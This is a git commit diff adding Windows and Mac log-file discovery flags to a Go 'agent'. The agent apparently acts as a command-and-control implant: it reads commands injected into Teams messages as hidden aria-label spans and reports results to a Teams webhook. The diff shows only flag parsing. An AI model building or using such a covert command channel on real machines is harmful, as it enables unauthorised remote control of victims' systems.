a3d21b9b3a977e6fadd9e2ee7cd6647be48c2940
x21497bk <benjamin.kidd@manchester.ac.uk>
2025-05-29 13:45:47 +0100

    adding -f functionality for windows and mac

--- cmd/agent/main.go
+++ cmd/agent/main.go
@@ -16,20 +16,26 @@ var (
 	timeout      int
 	webhookURL   string
 	commandRegex string
+	findLogfiles bool // Variable to hold the value of the -f flag
+	usingMac     bool // Variable to hold the value of the -m flag
 )
 
 func init() {
 	flag.BoolVar(&verbose, "v", false, "")
 	flag.StringVar(&serverURL, "s", "", "") // Insert in third parameter if you want to hardcode serverURL
 	flag.IntVar(&timeout, "t", 1, "")
-	flag.StringVar(&webhookURL, "w", "", "") // Insert in third parameter if you want to hardcode webhookURL
+	flag.StringVar(&webhookURL, "w", "", "")                                              // Insert in third parameter if you want to hardcode webhookURL
 	flag.StringVar(&commandRegex, "r", `<span[^>]*aria-label="([^"]*)"[^>]*></span>`, "") // For now use the default because server only supports aria-label injection
+	flag.BoolVar(&findLogfiles, "f", false, "Returns the log files path")
+	flag.BoolVar(&usingMac, "m", false, "Sets that mac is being used, this decreases available functionality.")
 
 	flag.BoolVar(&verbose, "verbose", false, "")
 	flag.StringVar(&serverURL, "server", "", "") // Insert in third parameter if you want to hardcode serverURL
 	flag.IntVar(&timeout, "timeout", 1, "")
-	flag.StringVar(&webhookURL, "webhook", "", "") // Insert in third parameter if you want to hardcode webhookURL
-	flag.StringVar(&commandRegex, "regex", `<span[^>]*aria-label="([^"]*)"[^>]*></span>`, "") // For now use the default because server only supports aria-label injection
+	flag.StringVar(&webhookURL, "webhook", "", "")                                                                // Insert in third parameter if you want to hardcode webhookURL
+	flag.StringVar(&commandRegex, "regex", `<span[^>]*aria-label="([^"]*)"[^>]*></span>`, "")                     // For now use the default because server only supports aria-label injection
+	flag.BoolVar(&findLogfiles, "find-logfiles", false, "Returns the log files path")                             // Support for --find-logfiles
+	flag.BoolVar(&usingMac, "mac", false, "Sets that mac is being used, this decreases available functionality.") // Support for --mac
 }
 
 func main() {
@@ -41,28 +47,36 @@ func main() {
 		fmt.Fprintf(os.Stderr, "  -w, --webhook   Teams Webhook POST URL\n")
 		fmt.Fprintf(os.Stderr, `  -r, --regex     Regex to match command (default "<span[^>]*aria-label=\"([^\"]*)\"[^>]*></span>")\n`)
 		fmt.Fprintf(os.Stderr, "  -f, --find-logfiles     Returns the log files path \n")
+		fmt.Fprintf(os.Stderr, "  -m, --mac       Sets that Mac is being used. This decreases available functionality. \n")
 	}
 
 	flag.Parse()
 
-	// if -f, --find-logfiles is set, find and print the log files path
-	if flag.NArg() > 0 && flag.Arg(0) == "find-logfiles" {
-		logDir, err := agent.findLogDir()
+	// if -f, --find-logfiles is set, find the log directory and files
+	if findLogfiles {
+		// defaulting log dir to empty and error to not found
+		logDir := ""
+		var err error
+		if usingMac {
+			logDir, err = agent.MacFindLogDir()
+		} else {
+			logDir, err = agent.FindLogDir()
+		}
 		if err != nil {
 			fmt.Fprintln(os.Stderr, "Error finding log directory:", err)
 			os.Exit(1)
 		}
 		fmt.Println("Log directory:", logDir)
-		logFiles, err := agent.findLogFiles(logDir)
+		logFiles, err := agent.FindLogFiles(logDir)
 		if err != nil {
-			fmt.Fprintln(os.Stderr, "Error finding log files:", err)
+			fmt.Fprintln(os.Stderr, "Error finding log directory and files path:", err)
 			os.Exit(1)
 		}
 		fmt.Println("Log files:")
 		for _, file := range logFiles {
 			fmt.Println(" -", file)
 		}
-		os.Exit(0)
+		os.Exit(0) // Exit after printing log files
 	}
 
 	err := agent.Start(verbose, serverURL, timeout, webhookURL, regexp.MustCompile(commandRegex))
